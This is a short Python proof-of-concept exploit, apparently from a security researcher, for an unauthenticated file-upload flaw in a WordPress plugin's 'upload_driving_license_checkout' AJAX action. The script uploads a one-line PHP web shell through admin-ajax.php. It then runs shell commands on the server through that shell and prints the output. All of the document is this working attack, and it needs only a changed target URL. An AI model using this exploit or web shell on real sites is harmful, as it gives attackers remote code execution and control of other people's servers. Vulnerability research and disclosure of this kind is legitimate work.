import json
import re

import requests

"""
Author: Mat Rollings (stealthcopter)
Website: sec.stealthcopter.com
"""

TARGET = 'http://wordpress.local:1337'  # No trailing slash

session = requests.session()


# Proxy can be uncommented here for debugging:
# session.proxies = {'http': 'http://localhost:8080'}


def upload_shell():
    files = {'driving_license_file': ('boatymcshellface.php', '<?php system($_REQUEST[\'cmd\']);')}
    data = {
        'action': 'upload_driving_license_checkout'
    }

    r = session.post(
        f'{TARGET}/wp-admin/admin-ajax.php',
        files=files,
        data=data
    )

    attach_id = re.search(r'data-file=\\"(\d+)\\"', r.text)
    attach_id = attach_id.group(1) if attach_id else None

    if attach_id:
        print(f'[+] Upload Success {attach_id}')
    else:
        print(f'[!] Upload Failed\n{r.text}')

    return attach_id


def hit_shell(post_id, cmd):
    url = f'{TARGET}/?p={post_id}&cmd={cmd}'
    r = requests.get(url)
    print(f"Shell output: \n{r.text}")


def exploit():
    if post_id:=upload_shell():
        print(f"[+] Upload successful to {TARGET}/?p={post_id}")
        hit_shell(post_id, 'id;pwd')
    else:
        print(f"[-] Upload failed")


exploit()
